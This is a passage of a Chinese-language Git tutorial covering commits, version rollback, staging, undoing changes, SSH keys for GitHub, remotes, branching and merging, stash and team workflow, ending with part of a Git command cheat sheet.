commit告诉Git，把文件提交到仓库。<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d2200001f05b04930121.png\"><br>\n\t现在我们已经提交了一个readme.txt文件了，我们下面可以通过命令git status来查看是否还有文件未提交，如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d2340001a87904690107.png\"><br>\n\t说明没有任何文件未提交，但是我现在继续来改下readme.txt内容，比如我在下面添加一行2222222222内容，继续使用git status来查看下结果，如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d2500001634606170171.png\"><br>\n\t上面的命令告诉我们 readme.txt文件已被修改，但是未被提交的修改。</p>\n\t</li>\n</ol><p>接下来我想看下readme.txt文件到底改了什么内容，如何查看呢？可以使用如下命令：</p>\n\n<p>git diff readme.txt 如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d2cb00010a0304960202.png\"><br>\n如上可以看到，readme.txt文件内容从一行11111111改成 二行 添加了一行22222222内容。</p>\n\n<p>知道了对readme.txt文件做了什么修改后，我们可以放心的提交到仓库了，提交修改和提交文件是一样的2步(第一步是git add 第二步是：git commit)。</p>\n\n<p>如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d2ff00015a9606180342.png\"><br>\n二：版本回退：<br>\n如上，我们已经学会了修改文件，现在我继续对readme.txt文件进行修改，再增加一行</p>\n\n<p>内容为33333333333333.继续执行命令如下：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d32b00012ba604570139.png\"><br>\n现在我已经对readme.txt文件做了三次修改了，那么我现在想查看下历史记录，如何查呢？我们现在可以使用命令 git log 演示如下所示：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d34e0001a1ac06050304.png\"><br>\ngit log命令显示从最近到最远的显示日志，我们可以看到最近三次提交，最近的一次是,增加内容为333333.上一次是添加内容222222，第一次默认是 111111.如果嫌上面显示的信息太多的话，我们可以使用命令 git log –pretty=oneline 演示如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d3fc00013ad206040097.png\"><br>\n现在我想使用版本回退操作，我想把当前的版本回退到上一个版本，要使用什么命令呢？可以使用如下2种命令，第一种是：git reset --hard HEAD^ 那么如果要回退到上上个版本只需把HEAD^ 改成 HEAD^^ 以此类推。那如果要回退到前100个版本的话，使用上面的方法肯定不方便，我们可以使用下面的简便命令操作：git reset --hard HEAD~100 即可。未回退之前的readme.txt内容如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d4140001a0c404490165.png\"><br>\n如果想回退到上一个版本的命令如下操作：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d429000199fc04610105.png\"></p>\n\n<p>再来查看下 readme.txt内容如下：通过命令cat readme.txt查看<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d4470001fcdc04360085.png\"></p>\n\n<p>可以看到，内容已经回退到上一个版本了。我们可以继续使用git log 来查看下历史记录信息，如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d45300012d9604800219.png\"></p>\n\n<p>我们看到 增加333333 内容我们没有看到了，但是现在我想回退到最新的版本，如：有333333的内容要如何恢复呢？我们可以通过版本号回退，使用命令方法如下：</p>\n\n<p>git reset --hard 版本号 ，但是现在的问题假如我已经关掉过一次命令行或者333内容的版本号我并不知道呢？要如何知道增加3333内容的版本号呢？可以通过如下命令即可获取到版本号：git reflog 演示如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d51a0001d5fc05100122.png\"></p>\n\n<p>通过上面的显示我们可以知道，增加内容3333的版本号是 6fcfc89.我们现在可以命令</p>\n\n<p>git reset --hard 6fcfc89来恢复了。演示如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d53a0001b8b305050153.png\"></p>\n\n<p>可以看到 目前已经是最新的版本了。</p>\n\n<p>三：理解工作区与暂存区的区别？<br>\n工作区：就是你在电脑上看到的目录，比如目录下testgit里的文件(.git隐藏目录版本库除外)。或者以后需要再新建的目录文件等等都属于工作区范畴。<br>\n版本库(Repository)：工作区有一个隐藏目录.git,这个不属于工作区，这是版本库。其中版本库里面存了很多东西，其中最重要的就是stage(暂存区)，还有Git为我们自动创建了第一个分支master,以及指向master的一个指针HEAD。</p>\n\n<p>我们前面说过使用Git提交文件到版本库有两步：</p>\n\n<p>第一步：是使用 git add 把文件添加进去，实际上就是把文件添加到暂存区。</p>\n\n<p>第二步：使用git commit提交更改，实际上就是把暂存区的所有内容提交到当前分支上。</p>\n\n<p>我们继续使用demo来演示下：</p>\n\n<p>我们在readme.txt再添加一行内容为4444444，接着在目录下新建一个文件为test.txt 内容为test，我们先用命令 git status来查看下状态，如下：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d55a0001a3c306430241.png\"></p>\n\n<p>现在我们先使用git add 命令把2个文件都添加到暂存区中，再使用git status来查看下状态，如下：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d56a0001a28704700241.png\"></p>\n\n<p>接着我们可以使用git commit一次性提交到分支上，如下：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d57b0001b4fe06190166.png\"></p>\n\n<p>四：Git撤销修改和删除文件操作。<br>\n一：撤销修改：<br>\n比如我现在在readme.txt文件里面增加一行 内容为555555555555，我们先通过命令查看如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d5e40001806803930139.png\"><br>\n在我未提交之前，我发现添加5555555555555内容有误，所以我得马上恢复以前的版本，现在我可以有如下几种方法可以做修改：</p>\n\n<p>第一：如果我知道要删掉那些内容的话，直接手动更改去掉那些需要的文件，然后add添加到暂存区，最后commit掉。</p>\n\n<p>第二：我可以按以前的方法直接恢复到上一个版本。使用 git reset --hard HEAD^</p>\n\n<p>但是现在我不想使用上面的2种方法，我想直接想使用撤销命令该如何操作呢？首先在做撤销之前，我们可以先用 git status 查看下当前的状态。如下所示：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d5fa0001b07806400168.png\"></p>\n\n<p>可以发现，Git会告诉你，git checkout -- file 可以丢弃工作区的修改，如下命令：<br>\ngit checkout -- readme.txt,如下所示：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d6390001419705210140.png\"></p>\n\n<p>命令 git checkout --readme.txt 意思就是，把readme.txt文件在工作区做的修改全部撤销，这里有2种情况，如下：</p>\n\n<p>1.readme.txt自动修改后，还没有放到暂存区，使用 撤销修改就回到和版本库一模一样的状态。<br>\n2.另外一种是readme.txt已经放入暂存区了，接着又作了修改，撤销修改就回到添加暂存区后的状态。<br>\n对于第二种情况，我想我们继续做demo来看下，假如现在我对readme.txt添加一行 内容为6666666666666，我git add 增加到暂存区后，接着添加内容7777777，我想通过撤销命令让其回到暂存区后的状态。如下所示：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d6ca0001782f06160482.png\"></p>\n\n<p>注意：命令git checkout -- readme.txt 中的 -- 很重要，如果没有 -- 的话，那么命令变成创建分支了。</p>\n\n<p>二：删除文件。<br>\n假如我现在版本库testgit目录添加一个文件b.txt,然后提交。如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d6de0001a31606390392.png\"></p>\n\n<p>如上：一般情况下，可以直接在文件目录中把文件删了，或者使用如上rm命令：rm b.txt ，如果我想彻底从版本库中删掉了此文件的话，可以再执行commit命令 提交掉，现在目录是这样的，</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d78200017e8f07030192.png\"></p>\n\n<p>只要没有commit之前，如果我想在版本库中恢复此文件如何操作呢？</p>\n\n<p>可以使用如下命令 git checkout -- b.txt，如下所示：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d7980001368e05570244.png\"></p>\n\n<p>再来看看我们testgit目录，添加了3个文件了。如下所示：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d7b70001308907550258.png\"></p>\n\n<p>五：远程仓库。<br>\n在了解之前，先注册github账号，由于你的本地Git仓库和github仓库之间的传输是通过SSH加密的，所以需要一点设置：<br>\n第一步：创建SSH Key。在用户主目录下，看看有没有.ssh目录，如果有，再看看这个目录下有没有id_rsa和id_rsa.pub这两个文件，如果有的话，直接跳过此如下命令，如果没有的话，打开命令行，输入如下命令：</p>\n\n<p>ssh-keygen -t rsa –C “youremail@example.com”, 由于我本地此前运行过一次，所以本地有，如下所示：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d7d7000120d107530169.png\"></p>\n\n<p>id_rsa是私钥，不能泄露出去，id_rsa.pub是公钥，可以放心地告诉任何人。</p>\n\n<p>第二步：登录github,打开” settings”中的SSH Keys页面，然后点击“Add SSH Key”,填上任意title，在Key文本框里黏贴id_rsa.pub文件的内容。<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d7ef0001c75411330860.png\"></p>\n\n<p>点击 Add Key，你就应该可以看到已经添加的key。<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d8540001eb3707620373.png\"></p>\n\n<p>如何添加远程库？<br>\n现在的情景是：我们已经在本地创建了一个Git仓库后，又想在github创建一个Git仓库，并且希望这两个仓库进行远程同步，这样github的仓库可以作为备份，又可以其他人通过该仓库来协作。</p>\n\n<p>首先，登录github上，然后在右上角找到“create a new repo”创建一个新的仓库。如下：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d86a0001044b10840605.png\"></p>\n\n<p>在Repository name填入testgit，其他保持默认设置，点击“Create repository”按钮，就成功地创建了一个新的Git仓库：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d8850001b5ea10260661.png\"></p>\n\n<pre class=\"has\">\n<code>目前，在GitHub上的这个testgit仓库还是空的，GitHub告诉我们，可以从这个仓库克隆出新的仓库，也可以把一个已有的本地仓库与之关联，然后，把本地仓库的内容推送到GitHub仓库。</code></pre>\n\n<p>现在，我们根据GitHub的提示，在本地的testgit仓库下运行命令：</p>\n\n<p>git remote add origin <a href=\"https://github.com/tugenhua0707/testgit.git\">https://github.com/tugenhua0707/testgit.git</a></p>\n\n<p>所有的如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d8a70001c86206320252.png\"></p>\n\n<p>把本地库的内容推送到远程，使用 git push命令，实际上是把当前分支master推送到远程。</p>\n\n<p>由于远程库是空的，我们第一次推送master分支时，加上了 –u参数，Git不但会把本地的master分支内容推送的远程新的master分支，还会把本地的master分支和远程的master分支关联起来，在以后的推送或者拉取时就可以简化命令。推送成功后，可以立刻在github页面中看到远程库的内容已经和本地一模一样了，上面的要输入github的用户名和密码如下所示：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d8bb00019ff310480655.png\"></p>\n\n<p>从现在起，只要本地作了提交，就可以通过如下命令：</p>\n\n<p>git push origin master</p>\n\n<p>把本地master分支的最新修改推送到github上了，现在你就拥有了真正的分布式版本库了。</p>\n\n<ol><li>\n\t<p>如何从远程库克隆？</p>\n\n\t<p>上面我们了解了先有本地库，后有远程库时候，如何关联远程库。</p>\n\n\t<p>现在我们想，假如远程库有新的内容了，我想克隆到本地来 如何克隆呢？</p>\n\n\t<p>首先，登录github，创建一个新的仓库，名字叫testgit2.如下：</p>\n\t</li>\n</ol><p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d95e0001f0fc10450604.png\"></p>\n\n<p>如下，我们看到：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d97400014d4e10360484.png\"></p>\n\n<p>现在，远程库已经准备好了，下一步是使用命令git clone克隆一个本地库了。如下所示：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d9860001e0d806370127.png\"></p>\n\n<p>接着在我本地目录下 生成testgit2目录了，如下所示：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d99500016a2e07130197.png\"></p>\n\n<p>六：创建与合并分支。<br>\n在 版本回填退里，你已经知道，每次提交，Git都把它们串成一条时间线，这条时间线就是一个分支。截止到目前，只有一条时间线，在Git里，这个分支叫主分支，即master分支。HEAD严格来说不是指向提交，而是指向master，master才是指向提交的，所以，HEAD指向的就是当前分支。</p>\n\n<p>首先，我们来创建dev分支，然后切换到dev分支上。如下操作：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1d9aa0001c15604080167.png\"></p>\n\n<p>git checkout 命令加上 –b参数表示创建并切换，相当于如下2条命令</p>\n\n<p>git branch dev</p>\n\n<p>git checkout dev</p>\n\n<p>git branch查看分支，会列出所有的分支，当前分支前面会添加一个星号。然后我们在dev分支上继续做demo，比如我们现在在readme.txt再增加一行 7777777777777</p>\n\n<p>首先我们先来查看下readme.txt内容，接着添加内容77777777，如下：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1da3f0001b5b703890392.png\"></p>\n\n<p>现在dev分支工作已完成，现在我们切换到主分支master上，继续查看readme.txt内容如下：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1da520001d44c06340206.png\"></p>\n\n<p>现在我们可以把dev分支上的内容合并到分支master上了，可以在master分支上，使用如下命令 git merge dev 如下所示：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1da69000145ca05320255.png\"></p>\n\n<p>git merge命令用于合并指定分支到当前分支上，合并后，再查看readme.txt内容，可以看到，和dev分支最新提交的是完全一样的。</p>\n\n<p>注意到上面的Fast-forward信息，Git告诉我们，这次合并是“快进模式”，也就是直接把master指向dev的当前提交，所以合并速度非常快。</p>\n\n<p>合并完成后，我们可以接着删除dev分支了，操作如下：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1da91000120cd06430139.png\"></p>\n\n<p>总结创建与合并分支命令如下：</p>\n\n<p>查看分支：git branch</p>\n\n<p>创建分支：git branch name</p>\n\n<p>切换分支：git checkout name</p>\n\n<p>创建+切换分支：git checkout –b name</p>\n\n<p>合并某分支到当前分支：git merge name</p>\n\n<p>删除分支：git branch –d name</p>\n\n<p>如何解决冲突？<br>\n下面我们还是一步一步来，先新建一个新分支，比如名字叫fenzhi1，在readme.txt添加一行内容8888888，然后提交，如下所示：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1db410001036105690462.png\"><br>\n同样，我们现在切换到master分支上来，也在最后一行添加内容，内容为99999999，如下所示：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1daaf0001133205840500.png\"></p>\n\n<p>现在我们需要在master分支上来合并fenzhi1，如下操作：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1daff000106eb06340589.png\"></p>\n\n<p>Git用&lt;&lt;&lt;&lt;&lt;&lt;&lt;，=======，&gt;&gt;&gt;&gt;&gt;&gt;&gt;标记出不同分支的内容，其中&lt;&lt;&lt;HEAD是指主分支修改的内容，&gt;&gt;&gt;&gt;&gt;fenzhi1 是指fenzhi1上修改的内容，我们可以修改下如下后保存：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1dbaf00015f2205770266.png\"></p>\n\n<p>如果我想查看分支合并的情况的话，需要使用命令 git log.命令行演示如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1dbc50001076c04970869.png\"></p>\n\n<pre class=\"has\">\n<code>3.分支管理策略。\n\n  通常合并分支时，git一般使用”Fast forward”模式，在这种模式下，删除分支后，会丢掉分支信息，现在我们来使用带参数 –no-ff来禁用”Fast forward”模式。首先我们来做demo演示下：</code></pre>\n\n<p>创建一个dev分支。<br>\n修改readme.txt内容。<br>\n添加到暂存区。<br>\n切换回主分支(master)。<br>\n合并dev分支，使用命令 git merge –no-ff -m “注释” dev<br>\n查看历史记录<br>\n截图如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1dbdc0001836d06030780.png\"></p>\n\n<p>分支策略：首先master主分支应该是非常稳定的，也就是用来发布新版本，一般情况下不允许在上面干活，干活一般情况下在新建的dev分支上干活，干完后，比如上要发布，或者说dev分支代码稳定后可以合并到主分支master上来。</p>\n\n<p>七：bug分支：<br>\n在开发中，会经常碰到bug问题，那么有了bug就需要修复，在Git中，分支是很强大的，每个bug都可以通过一个临时分支来修复，修复完成后，合并分支，然后将临时的分支删除掉。</p>\n\n<p>比如我在开发中接到一个404 bug时候，我们可以创建一个404分支来修复它，但是，当前的dev分支上的工作还没有提交。比如如下：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1dc4e000141b306260166.png\"></p>\n\n<p>并不是我不想提交，而是工作进行到一半时候，我们还无法提交，比如我这个分支bug要2天完成，但是我issue-404 bug需要5个小时内完成。怎么办呢？还好，Git还提供了一个stash功能，可以把当前工作现场 ”隐藏起来”，等以后恢复现场后继续工作。如下：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1dc63000121ff06510188.png\"></p>\n\n<p>所以现在我可以通过创建issue-404分支来修复bug了。</p>\n\n<p>首先我们要确定在那个分支上修复bug，比如我现在是在主分支master上来修复的，现在我要在master分支上创建一个临时分支，演示如下：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1dc7000010f8506010533.png\"></p>\n\n<p>修复完成后，切换到master分支上，并完成合并，最后删除issue-404分支。演示如下：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1dce00001c1ed06120441.png\"><br>\n现在，我们回到dev分支上干活了。<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1dcfa00019c8104220136.png\"></p>\n\n<p>工作区是干净的，那么我们工作现场去哪里呢？我们可以使用命令 git stash list来查看下。如下：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1dd07000152b404340093.png\"></p>\n\n<p>工作现场还在，Git把stash内容存在某个地方了，但是需要恢复一下，可以使用如下2个方法：</p>\n\n<p>1.git stash apply恢复，恢复后，stash内容并不删除，你需要使用命令git stash drop来删除。<br>\n2.另一种方式是使用git stash pop,恢复的同时把stash内容也删除了。<br>\n演示如下</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1dd1f000174d406380466.png\"></p>\n\n<p>八：多人协作。<br>\n当你从远程库克隆时候，实际上Git自动把本地的master分支和远程的master分支对应起来了，并且远程库的默认名称是origin。</p>\n\n<p>要查看远程库的信息 使用 git remote<br>\n要查看远程库的详细信息 使用 git remote –v<br>\n如下演示：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1dd7d000136fd06190169.png\"></p>\n\n<p>一：推送分支：</p>\n\n<pre class=\"has\">\n<code>  推送分支就是把该分支上所有本地提交到远程库中，推送时，要指定本地分支，这样，Git就会把该分支推送到远程库对应的远程分支上：\n\n  使用命令 git push origin master</code></pre>\n\n<p>比如我现在的github上的readme.txt代码如下：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1dd90000164a508280459.png\"></p>\n\n<p>本地的readme.txt代码如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1dda60001771804210205.png\"></p>\n\n<p>现在我想把本地更新的readme.txt代码推送到远程库中，使用命令如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1ddbf0001271e05410203.png\"></p>\n\n<p>我们可以看到如上，推送成功，我们可以继续来截图github上的readme.txt内容 如下：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1ddcf0001771f08100484.png\"></p>\n\n<p>可以看到 推送成功了，如果我们现在要推送到其他分支，比如dev分支上，我们还是那个命令 git push origin dev</p>\n\n<p>那么一般情况下，那些分支要推送呢？</p>\n\n<p>master分支是主分支，因此要时刻与远程同步。<br>\n一些修复bug分支不需要推送到远程去，可以先合并到主分支上，然后把主分支master推送到远程去。<br>\n二：抓取分支：</p>\n\n<p>多人协作时，大家都会往master分支上推送各自的修改。现在我们可以模拟另外一个同事，可以在另一台电脑上（注意要把SSH key添加到github上）或者同一台电脑上另外一个目录克隆，新建一个目录名字叫testgit2</p>\n\n<p>但是我首先要把dev分支也要推送到远程去，如下</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1ded800014adf05030151.jpg\"></p>\n\n<p>接着进入testgit2目录，进行克隆远程的库到本地来，如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1deb70001ec7605080170.png\"></p>\n\n<p>现在目录下生成有如下所示：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1defe0001942707180256.png\"><br>\n现在我们的小伙伴要在dev分支上做开发，就必须把远程的origin的dev分支到本地来，于是可以使用命令创建本地dev分支：git checkout –b dev origin/dev</p>\n\n<p>现在小伙伴们就可以在dev分支上做开发了，开发完成后把dev分支推送到远程库时。</p>\n\n<p>如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1df160001ef1e06020730.png\"></p>\n\n<p>小伙伴们已经向origin/dev分支上推送了提交，而我在我的目录文件下也对同样的文件同个地方作了修改，也试图推送到远程库时，如下：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1df340001209306470759.png\"></p>\n\n<p>由上面可知：推送失败，因为我的小伙伴最新提交的和我试图推送的有冲突，解决的办法也很简单，上面已经提示我们，先用git pull把最新的提交从origin/dev抓下来，然后在本地合并，解决冲突，再推送。</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1dfa60001473e05940282.png\"></p>\n\n<p>git pull也失败了，原因是没有指定本地dev分支与远程origin/dev分支的链接，根据提示，设置dev和origin/dev的链接：如下：</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1dfc8000159c106460199.png\"></p>\n\n<p>这回git pull成功，但是合并有冲突，需要手动解决，解决的方法和分支管理中的 解决冲突完全一样。解决后，提交，再push：<br>\n我们可以先来看看readme.txt内容了。</p>\n\n<p><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1dff70001a87605190277.png\"></p>\n\n<p>现在手动已经解决完了，我接在需要再提交，再push到远程库里面去。如下所示：<br><img alt=\"图片描述\" class=\"has\" src=\"http://img1.sycdn.imooc.com/59c1e0130001843906050480.png\"></p>\n\n<p>因此：多人协作工作模式一般是这样的：</p>\n\n<p>首先，可以试图用git push origin branch-name推送自己的修改.<br>\n如果推送失败，则因为远程分支比你的本地更新早，需要先用git pull试图合并。<br>\n如果合并有冲突，则需要解决冲突，并在本地提交。再用git push origin branch-name推送。</p>\n\n<p>感谢龙恩的贡献：<a href=\"http://www.cnblogs.com/tugenhua0707/p/4050072.html\" rel=\"nofollow\">http://www.cnblogs.com/tugenhua0707/p/4050072.html</a></p>\n\n<hr><hr><p>参考阮老师整理的部分命令：<a href=\"http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html\" rel=\"nofollow\">http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html</a>。<br>\n一、新建代码库</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code># 在当前目录新建一个Git代码库</code></p>\n\n\t\t\t<p><code>$ git init</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 新建一个目录，将其初始化为Git代码库</code></p>\n\n\t\t\t<p><code>$ git init [project-name]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 下载一个项目和它的整个代码历史</code></p>\n\n\t\t\t<p><code>$ git clone [url]</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>　　</p>\n\n<p>二、配置</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code># 显示当前的Git配置</code></p>\n\n\t\t\t<p><code>$ git config --list</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 编辑Git配置文件</code></p>\n\n\t\t\t<p><code>$ git config -e [--global]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 设置提交代码时的用户信息</code></p>\n\n\t\t\t<p><code>$ git config [--global] user.name </code><code>\"[name]\"</code></p>\n\n\t\t\t<p><code>$ git config [--global] user.email </code><code>\"[email address]\"</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>　　</p>\n\n<p>三、增加/删除文件</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code># 添加指定文件到暂存区</code></p>\n\n\t\t\t<p><code>$ git add [file1] [file2] ...</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 添加指定目录到暂存区，包括子目录</code></p>\n\n\t\t\t<p><code>$ git add [dir]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 添加当前目录的所有文件到暂存区</code></p>\n\n\t\t\t<p><code>$ git add .</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 添加每个变化前，都会要求确认</code></p>\n\n\t\t\t<p><code># 对于同一个文件的多处变化，可以实现分次提交</code></p>\n\n\t\t\t<p><code>$ git add -p</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 删除工作区文件，并且将这次删除放入暂存区</code></p>\n\n\t\t\t<p><code>$ git rm [file1] [file2] ...</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 停止追踪指定文件，但该文件会保留在工作区</code></p>\n\n\t\t\t<p><code>$ git rm --cached [file]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 改名文件，并且将这个改名放入暂存区</code></p>\n\n\t\t\t<p><code>$ git mv [file-original] [file-renamed]</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>　　</p>\n\n<p>四、代码提交</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code># 提交暂存区到仓库区</code></p>\n\n\t\t\t<p><code>$ git commit -m [message]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 提交暂存区的指定文件到仓库区</code></p>\n\n\t\t\t<p><code>$ git commit [file1] 